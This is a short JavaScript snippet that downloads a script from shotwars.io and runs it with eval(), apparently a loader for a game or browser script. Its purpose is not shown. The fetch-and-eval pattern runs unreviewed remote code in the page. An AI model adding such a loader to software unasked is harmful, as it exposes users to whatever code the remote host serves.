let xhttpt = new XMLHttpRequest();
xhttpt.open("GET", "https://shotwars.io/js/c197.js");
xhttpt.responseType = "text";
xhttpt.addEventListener("load", function() {
	eval(xhttpt.response);
});
xhttpt.send();
